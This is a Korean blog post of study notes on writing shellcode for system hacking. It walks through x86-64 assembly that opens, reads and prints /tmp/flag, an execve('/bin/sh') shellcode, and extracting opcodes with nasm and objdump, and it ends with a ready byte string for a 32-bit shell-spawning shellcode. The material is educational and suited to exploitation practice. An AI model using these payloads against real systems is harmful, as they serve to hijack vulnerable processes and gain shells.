---
layout: post
title: "shellcode"
categories: [System Hacking]
tags: [shellcode, exploit, assembly, C]
last_modified_at: 2024-01-22
---

Exploit Tech: Shellcode

1. orw 셸코드  
파일을 열고, 읽은 뒤 화면에 출력하는 셸코드  
/tmp/flag를 읽는 셸코드  
```cpp
char buf[0x30];

int fd = open("/tmp/flag", RD_ONLY, NULL);
read(fd, buf, 0x30); 
write(1, buf, 0x30);
```
syscall 레지스터, 인자 정리  
| syscall | rax | arg0 (rdi) | arg1 (rsi) | arg2 (rdx) |
|---------|-----|-------------|-------------|-------------|
| read    | 0x00| unsigned int fd | char *buf | size_t count |
| write   | 0x01| unsigned int fd | const char *buf | size_t count |
| open    | 0x02| const char *filename | int flags | umode_t mode |

c언어 코드의 각 줄을 어셈블리로 구현하는 실습  
**1. int fd = open("/tmp/flag", RD_ONLY, NULL)**  
| open | 0x02 | const char *filename | int flags | umode_t mode |
|------|-------|---------------------|-----------|---------------|

위에 맞게 인자를 넣어줘야 함  
먼저 메모리에 "/tmp/flag"문자열 넣어줘야함.. 문자열은 스택으로 들어가니까 스택에 넣어줘야 하는데  
16진수 값 0x616c662f706d742f67인데 8바이트 단위로만 push 가능하므로 0x67 push 후 나머지 값 push  
이후 rsp(스택)을 rdi로 옮김(인자로 넣기 위해)  

rsi(flag)는 0으로 설정  
아래는 flag 설정에 대한 접은글  
<div data-ke-type="moreLess" data-text-less="닫기" data-text-more="더보기"><a class="btn-toggle-moreless">더보기</a>
<div class="moreless-content"><a class="btn-toggle-moreless">더보기</a>
<div class="moreless-content">
```
// https://code.woboq.org/userspace/glibc/bits/fcntl.h.html#24
/* File access modes for `open' and `fcntl'. */
#define O_RDONLY 0 /* Open read-only. */
#define O_WRONLY 1 /* Open write-only. */
#define O_RDWR 2   /* Open read/write. */
```
</div>
</div>
</div>
mode는 의미 없음, rdx는 0으로 설정  
rax는 2  
```shell
push 0x67
mov rax, 0x616c662f706d742f 
push rax ;문자열 push 
mov rdi, rsp    ; rdi = "/tmp/flag" ;rdi 설정
xor rsi, rsi    ; rsi = 0 ; RD_ONLY
xor rdx, rdx    ; rdx = 0
mov rax, 2      ; rax = 2 ; syscall_open 
syscall         ; open("/tmp/flag", RD_ONLY, NULL)
```

**2. read(fd, buf, 0x30)**  
| read | 0x00 | unsigned int fd | char *buf | size_t count |
|------|-------|-----------------|-----------|---------------|

syscall의 반환값 rax에 저장, 때문에 open으로 획득한 fd는 rax에 저장  
이를 rdi에 대입(인자로 넣기 위해)  
char buf[0x30]했으니 0x30만큼 읽을 것임 상단 rsp에서 30만큼 저장하기 위해 rsi에는 rsp-0x30 대입  
rdx는 읽을 데이터 크기를 말하므로 0x30  
```shell
mov rdi, rax      ; rdi = fd
mov rsi, rsp
sub rsi, 0x30     ; rsi = rsp-0x30 ; buf
mov rdx, 0x30     ; rdx = 0x30     ; len
mov rax, 0x0      ; rax = 0        ; syscall_read
syscall           ; read(fd, buf, 0x30)
```
아래는 fd 설명  
<div data-ke-type="moreLess" data-text-less="닫기" data-text-more="더보기"><a class="btn-toggle-moreless">더보기</a>
<div class="moreless-content"><a class="btn-toggle-moreless">더보기</a>
<div class="moreless-content">
파일 서술자: 프로세스와 터미널을 연결하는 역할  
일반 입력(0), 일반 출력(1), 일반 오류(2)  
</div>
</div>
</div>

**3. write(1, buf, 0x30)**  
| write | 0x01 | unsigned int fd | const char *buf | size_t count |
|-------|-------|-----------------|------------------|---------------|

stdout이기에 rdi 0x1 설정  
```shell
mov rdi, 1        ; rdi = 1 ; fd = stdout
mov rax, 0x1      ; rax = 1 ; syscall_write
syscall           ; write(fd, buf, 0x30)
```

1,2,3 step에서 구현한 코드 모두 합해줌 확장자는 s  
여기서 리눅스 실행파일인 ELF로 포맷 변경을 해줘야함 -> gcc 컴파일러 사용  

**어셈블리 코드 컴파일**  
셸코드를 실행할 수 있는 스켈레톤 코드 C로 작성  
```cpp
// File name: sh-skeleton.c
// Compile Option: gcc -o sh-skeleton sh-skeleton.c -masm=intel

__asm__(
    ".global run_sh\n"
    "run_sh:\n"

    "Input your shellcode here.\n"
    "Each line of your shellcode should be\n"
    "seperated by '\n'\n"

    "xor rdi, rdi   # rdi = 0\n"
    "mov rax, 0x3c	# rax = sys_exit\n"
    "syscall        # exit(0)");

void run_sh();

int main() { run_sh(); }
```
문자열 자리에 구현해준 s확장자 코드 집어 넣기 -> 문자열 형태로 한 줄씩 작성!!!

2. execve 셸코드  
임의의 프로그램을 실행하는 셸코드  
서버의 셸을 획득할 수 있음  

**execve("/bin/sh", null, null)**  
| syscall | rax | rdi | rsi | rdx |
|---------|-----|-----|-----|-----|
| execve  | 0x3b| const char *filename | const char *const *argv | const char *const *envp |

null은 xor로 처리  
```shell
;Name: execve.S

mov rax, 0x68732f6e69622f
push rax
mov rdi, rsp  ; rdi = "/bin/sh\x00"
xor rsi, rsi  ; rsi = NULL
xor rdx, rdx  ; rdx = NULL
mov rax, 0x3b ; rax = sys_execve
syscall       ; execve("/bin/sh", null, null)
```

3. objdump를 이용한 shellcode 추출  
셸코드를 byte code(opcode)로 추출하는 방법  
```shell
; File name: shellcode.asm
section .text
global _start
_start:
xor    eax, eax
push   eax
push   0x68732f2f
push   0x6e69622f
mov    ebx, esp
xor    ecx, ecx
xor    edx, edx
mov    al, 0xb
int    0x80
```
위 어셈블리 코드 변환  
```shell
$ sudo apt-get install nasm
$ nasm -f elf shellcode.asm
$ objdump -d shellcode.o
shellcode.o:     file format elf32-i386
Disassembly of section .text:
00000000 <_start>:
   0:	31 c0                	xor    %eax,%eax
   2:	50                   	push   %eax
   3:	68 2f 2f 73 68       	push   $0x68732f2f
   8:	68 2f 62 69 6e       	push   $0x6e69622f
   d:	89 e3                	mov    %esp,%ebx
   f:	31 c9                	xor    %ecx,%ecx
  11:	31 d2                	xor    %edx,%edx
  13:	b0 0b                	mov    $0xb,%al
  15:	cd 80                	int    $0x80
```
nasm 툴 설치 후 object 파일을 만들기  
```shell
$ objcopy --dump-section .text=shellcode.bin shellcode.o
$ xxd shellcode.bin
00000000: 31c0 5068 2f2f 7368 682f 6269 6e89 e331  1.Ph//shh/bin..1
00000010: c931 d2b0 0bcd 80                        .1.....
```
objcopy로 바이너리 파일 제작  
```shell
# execve /bin/sh shellcode: 
"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x31\xd2\xb0\x0b\xcd\x80"
```